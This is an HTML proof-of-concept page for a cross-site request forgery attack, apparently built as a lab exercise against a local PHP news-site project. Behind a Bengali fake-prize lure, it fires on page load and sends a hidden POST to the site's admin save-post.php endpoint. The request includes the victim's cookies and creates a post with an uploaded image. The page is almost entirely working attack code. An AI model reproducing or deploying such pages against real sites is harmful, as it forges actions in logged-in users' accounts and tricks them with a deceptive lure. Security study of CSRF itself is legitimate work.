<!DOCTYPE html>
<html>

<head>
    <title>Fake Prize Page</title>
</head>

<body>
    <h1>অভিনন্দন! আপনি ১০০০ টাকা জিতেছেন!</h1>
    <p>টাকাটি গ্রহণ করতে এই পেজটি লোড হতে দিন...</p>
    <form id="attack-form" action="http://localhost/news-site/admin/save-post.php" method="POST"
        enctype="multipart/form-data">
        <input type="hidden" name="post_title" value="Hacked with Real Image!">
        <input type="hidden" name="postdesc" value="CSRF Attack successful with image upload.">
        <input type="hidden" name="category" value="31">
        <input type="hidden" name="submit" value="Save">
    </form>

    <script>
        async function startAttack() {
            const imageUrl = 'https://picsum.photos/seed/picsum/500/300.jpg';
            const resp = await fetch(imageUrl);
            const blob = await resp.blob();

            const data = new FormData();
            data.append('post_title', 'Final CSRF Attack');
            data.append('postdesc', 'Image upload fixed!');
            data.append('category', '31');

            //uploadFile with proper data;
            const file = new File([blob], 'image.jpg', { type: 'image/jpeg' });
            data.append('fileToUpload', file);
            data.append('submit', 'Save');

            // Fetch request with credentials
            fetch('http://localhost/PHP%20Basic%202025/news-template/news-template/admin/save-post.php', {
                method: 'POST',
                body: data,
                credentials: 'include', //to send cookies
            }).then(() => {
                alert('Post and Image Uploaded!');
                window.location.href = "http://localhost/PHP%20Basic%202025/news-template/news-template/admin/post.php";
            });
        }
        window.onload = startAttack;
    </script>
</body>

</html>